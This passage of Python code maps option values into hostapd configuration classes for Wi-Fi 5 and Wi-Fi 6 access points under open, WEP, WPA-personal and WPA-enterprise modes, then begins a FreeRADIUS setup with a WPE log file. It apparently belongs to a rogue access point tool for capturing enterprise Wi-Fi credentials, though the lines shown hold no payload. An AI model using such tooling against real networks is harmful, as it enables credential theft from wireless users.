                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi5.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi5.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi5.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        elif(options['80211_preset_profile'] == 'wifi6'):
            if(options['auth'] == 'open'):
                conf_manager.HostapdWifi6.OpenCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    ieee80211ax=options['ieee80211ax'],
                    require_he=options['require_he'],
                    he_su_beamformer=options['he_su_beamformer'],
                    he_su_beamformee=options['he_su_beamformee'],
                    he_mu_beamformer=options['he_mu_beamformer'],
                    he_bss_color=options['he_bss_color'],
                    he_default_pe_duration=options['he_default_pe_duration'],
                    he_basic_mcs_nss_set=options['he_basic_mcs_nss_set'],
                )
            elif(options['auth'] == 'wep'):
                conf_manager.HostapdWifi6.WepCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    ieee80211ax=options['ieee80211ax'],
                    require_he=options['require_he'],
                    he_su_beamformer=options['he_su_beamformer'],
                    he_su_beamformee=options['he_su_beamformee'],
                    he_mu_beamformer=options['he_mu_beamformer'],
                    he_bss_color=options['he_bss_color'],
                    he_default_pe_duration=options['he_default_pe_duration'],
                    he_basic_mcs_nss_set=options['he_basic_mcs_nss_set'],
                    wep_default_key=options['wep_default_key'],
                    wep_key=options['wep_key'],
                )
            elif(options['auth'] == 'wpa-personal'):
                conf_manager.HostapdWifi6.WpaCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    ieee80211ax=options['ieee80211ax'],
                    require_he=options['require_he'],
                    he_su_beamformer=options['he_su_beamformer'],
                    he_su_beamformee=options['he_su_beamformee'],
                    he_mu_beamformer=options['he_mu_beamformer'],
                    he_bss_color=options['he_bss_color'],
                    he_default_pe_duration=options['he_default_pe_duration'],
                    he_basic_mcs_nss_set=options['he_basic_mcs_nss_set'],
                    wpa=options['wpa'],
                    wpa_passphrase=options['wpa_passphrase'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise']
                )
            elif(options['auth'] == 'wpa-enterprise'):
                conf_manager.HostapdWifi6.WpaEapCnf.configure(
                    hw_mode=options['hw_mode'],
                    channel=options['channel'],
                    country_code=options['country_code'],
                    ieee80211d=options['ieee80211d'],
                    ieee80211h=options['ieee80211h'],
                    driver=options['driver'],
                    interface=options['interface'],
                    ssid=options['essid'],
                    beacon_interval=options['beacon_interval'],
                    bssid=options['bssid'],
                    macaddr_acl=options['macaddr_acl'],
                    macaddr_accept_file=options['macaddr_accept_file'],
                    macaddr_deny_file=options['macaddr_deny_file'],
                    ap_isolate=options['ap_isolate'],
                    essid_mask=options['essid_mask'],
                    require_ht=options['require_ht'],
                    ieee80211n=options['ieee80211n'],
                    wmm_enabled=options['wmm_enabled'],
                    ht_capab=options['ht_capab'],
                    wmm_ac_bk_cwmin=options['wmm_ac_bk_cwmin'],
                    wmm_ac_bk_cwmax=options['wmm_ac_bk_cwmax'],
                    wmm_ac_bk_aifs=options['wmm_ac_bk_aifs'],
                    wmm_ac_bk_txop_limit=options['wmm_ac_bk_txop_limit'],
                    wmm_ac_bk_acm=options['wmm_ac_bk_acm'],
                    wmm_ac_be_aifs=options['wmm_ac_be_aifs'],
                    wmm_ac_be_cwmin=options['wmm_ac_be_cwmin'],
                    wmm_ac_be_cwmax=options['wmm_ac_be_cwmax'],
                    wmm_ac_be_txop_limit=options['wmm_ac_be_txop_limit'],
                    wmm_ac_be_acm=options['wmm_ac_be_acm'],
                    wmm_ac_vi_aifs=options['wmm_ac_vi_aifs'],
                    wmm_ac_vi_cwmin=options['wmm_ac_vi_cwmin'],
                    wmm_ac_vi_cwmax=options['wmm_ac_vi_cwmax'],
                    wmm_ac_vi_txop_limit=options['wmm_ac_vi_txop_limit'],
                    wmm_ac_vi_acm=options['wmm_ac_vi_acm'],
                    wmm_ac_vo_aifs=options['wmm_ac_vo_aifs'],
                    wmm_ac_vo_cwmin=options['wmm_ac_vo_cwmin'],
                    wmm_ac_vo_cwmax=options['wmm_ac_vo_cwmax'],
                    wmm_ac_vo_txop_limit=options['wmm_ac_vo_txop_limit'],
                    wmm_ac_vo_acm=options['wmm_ac_vo_acm'],
                    tx_queue_data3_aifs=options['tx_queue_data3_aifs'],
                    tx_queue_data3_cwmin=options['tx_queue_data3_cwmin'],
                    tx_queue_data3_cwmax=options['tx_queue_data3_cwmax'],
                    tx_queue_data3_burst=options['tx_queue_data3_burst'],
                    tx_queue_data2_aifs=options['tx_queue_data2_aifs'],
                    tx_queue_data2_cwmin=options['tx_queue_data2_cwmin'],
                    tx_queue_data2_cwmax=options['tx_queue_data2_cwmax'],
                    tx_queue_data2_burst=options['tx_queue_data2_burst'],
                    tx_queue_data1_aifs=options['tx_queue_data1_aifs'],
                    tx_queue_data1_cwmin=options['tx_queue_data1_cwmin'],
                    tx_queue_data1_cwmax=options['tx_queue_data1_cwmax'],
                    tx_queue_data1_burst=options['tx_queue_data1_burst'],
                    tx_queue_data0_aifs=options['tx_queue_data0_aifs'],
                    tx_queue_data0_cwmin=options['tx_queue_data0_cwmin'],
                    tx_queue_data0_cwmax=options['tx_queue_data0_cwmax'],
                    tx_queue_data0_burst=options['tx_queue_data0_burst'],
                    ieee80211ac=options['ieee80211ac'],
                    require_vht=options['require_vht'],
                    vht_oper_chwidth=options['vht_oper_chwidth'],
                    vht_operations=options['vht_operations'],
                    vht_capability=options['vht_capab'],
                    ieee80211ax=options['ieee80211ax'],
                    require_he=options['require_he'],
                    he_su_beamformer=options['he_su_beamformer'],
                    he_su_beamformee=options['he_su_beamformee'],
                    he_mu_beamformer=options['he_mu_beamformer'],
                    he_bss_color=options['he_bss_color'],
                    he_default_pe_duration=options['he_default_pe_duration'],
                    he_basic_mcs_nss_set=options['he_basic_mcs_nss_set'],
                    wpa=options['wpa'],
                    wpa_pairwise=options['wpa_pairwise'],
                    rsn_pairwise=options['rsn_pairwise'],
                    ieee8021x=options['ieee8021x'],
                    eapol_version=options['eapol_version'],
                    eapol_workaround=options['eapol_workaround'],
                    own_ip_addr=options['own_ip_addr'],
                    auth_server_addr=options['auth_server_addr'],
                    auth_server_shared_secret=options['auth_server_shared_secret'],
                    auth_server_port=options['auth_server_port'],
                    acct_server_addr=options['acct_server_addr'],
                    acct_server_shared_secret=options['acct_server_shared_secret'],
                    acct_server_port=options['acct_server_port'],
                    eap_user_file=options['eap_user_file'],
                    ca_pem=options['ca_certificate'],
                    server_pem=options['server_certificate'],
                    private_key=options['server_private_key'],
                    private_key_passwd=options['server_private_key_password'],
                    dh_file=config.dh_file
                )
        else:
            pass

        if(options['auth'] == 'wpa-enterprise'):
            conf_manager.freeradius_radiusd_conf.configure(
                logdir=config.logdir,
                radiuslog=config.radiuslog,
                wpelogfile=config.wpelogfile,
